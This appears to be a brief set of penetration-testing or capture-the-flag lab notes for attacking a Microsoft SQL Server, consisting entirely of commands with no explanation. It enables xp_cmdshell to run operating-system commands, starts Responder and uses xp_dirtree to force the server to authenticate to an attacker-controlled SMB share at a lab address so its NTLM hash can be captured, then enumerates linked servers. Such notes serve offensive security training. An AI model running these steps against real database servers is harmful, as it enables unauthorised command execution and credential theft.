# step 1
EXECUTE sp_configure 'show advanced options', 1
enable_xp_cmdshell
xp_cmdshell whoami
# step 2
responder -I tun0
EXEC xp_dirtree '\\10.10.14.xx\share', 1, 1
# step 3
enum_links
